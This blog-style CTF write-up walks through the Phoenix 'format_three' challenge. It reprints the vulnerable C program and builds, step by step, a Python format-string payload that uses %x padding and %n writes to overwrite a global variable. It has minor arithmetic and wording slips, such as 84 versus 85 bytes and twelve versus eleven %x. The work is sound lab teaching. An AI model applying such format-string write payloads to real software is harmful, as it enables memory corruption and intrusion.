---
title: Phoenix - format_three 
date: 2026-06-11 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix format_three ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge format_three from the series Phoenix found at <https://exploit.education/phoenix/format-three/>

## Step one
Firstly, i inspect the source code, this time i will be exploiting the function __printf__:

```
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

## Step two
Firstly, i need to know the memory address where the variable `changeme` is stored. This can be done via running "info var" in gdb as seen below.

![](assets/posts/PWN/phoenix_format_three/var.png)


After knowing where it is stored, i will need to determine where my input is stored on the stack. According to the source code, i will need to set a breakpoint before __printf__ is called. I will be setting a breakpoint at the __bounce__ function. 

![](assets/posts/PWN/phoenix_format_three/bp.png)

At the breakpoint, i ran "x/32x" which showed the topmost 32 stack values. I noticed that my input "AAAA" was located at an offset of 12 bytes. 

![](assets/posts/PWN/phoenix_format_three/bp.png)

As it is located at a 12 bytes offset, i used "%x" 12 times in my payload followed by "%n". This gives me the current payload of:

```
changeme = b"\x20\x90\x55\x56" #target address
changeme += b"\x21\x90\x55\x56"
changeme += b"\x22\x90\x55\x56"
changeme += b"\x23\x90\x55\x56"
changeme += b"%x" * 11     # offset to first byte
changeme += b"%n" #check no.

sys.stdout.buffer.write(changeme)
```

This gave me the following output:

![](assets/posts/PWN/phoenix_format_three/output.png)

This showed that 0x55(85) bytes were counted so far. As i want to write 0x45 into `0x56559020` and with the current number of characters being `0x54` (84) bytes, i can only count up which gives me the closest number being 0x145 AKA 325 bytes. This means i have to add 240 "junk" bytes to write `0x145`. I modified my script to include the following lines:

```
changeme += b"A" * 240
changeme += b"%n" # write
```

This gave me the following output:
![](assets/posts/PWN/phoenix_format_three/inc1.png)


As i need to write `0x78` into `0x56559021` , i will add 51 junk bytes.

```
changeme += b"A" * 51
changeme += b"%n" # write
```

Which gave me the following output:

![](assets/posts/PWN/phoenix_format_three/inc2.png)


As i need to write `0x45` into `0x56559022` with the closest number being `0x245`, i will add 205 junk bytes. 

```
changeme += b"A" * 205
changeme += b"%n"
```
Which gave me the following output:

![](assets/posts/PWN/phoenix_format_three/inc3.png)

As i need to write `0x64` into `0x56559023` with the closest number being `0x264`, i will add 31 junk bytes.

```
changeme += b"A" * 31
changeme += b"%n"

```
This gave me the following output:

![](assets/posts/PWN/phoenix_format_three/flag.png)






